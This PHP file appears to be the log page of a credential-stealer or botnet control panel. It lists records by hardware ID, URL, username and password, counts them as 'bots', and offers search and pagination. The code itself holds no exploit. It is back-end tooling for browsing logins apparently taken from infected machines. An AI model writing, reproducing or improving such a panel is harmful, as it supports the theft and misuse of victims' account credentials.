<?php
include '../inc/config.php';
include '../inc/functions.php';
$perpage = $settings->logspg;
$init = 0;
$end = $perpage;
$search = isset($_GET['search'])?htmlspecialchars($_GET['search'],ENT_QUOTES,'UTF-8'):"";
$like = empty($search)?'':'WHERE hwid LIKE :search OR url LIKE :search';
$t = $con->prepare("SELECT COUNT(*) FROM logs $like");
$t->execute(array(':search' => '%'.$search.'%'));
$bots = $t->fetch()[0];
?>
<div id="content-box">
    <table>
        <th>HWID</th>
        <th>Url</th>
        <th>Username</th>
        <th>Password</th>
        <th>Added</th>

        <?php
        printLogs($init,$perpage,$search);
        ?>
    </table>
</div>

<div id="content-footer">
    <div id="navigation">
        <ul>
            <li><a href="logs.php?search=<?php echo $search;?>"><<</a></li>
            <?php
            for($i = $init - $perpage*10; $i <= $init + $perpage*10; $i+=$perpage) {
                $pi = $i-$perpage;
                $pe = $i;
                $text = $i/$perpage;
                if($text > 0 && $i - $perpage < $bots) {
                    if ($init == $i-$perpage && $end == $i) $text = "<span class=\"green\">$text</span>";
                    echo "<li><a href=\"?init=$pi&end=$pe&search=$search\">$text</a></li>";
                }
            }
            $t = ((int)($bots/$perpage)) * $perpage;
            ?>
            <li><a href="?init=<?php echo $t;?>&end=<?php echo $t + $perpage;?>&search=<?php echo $search;?>">>></a></li>
        </ul>
    </div>
</div>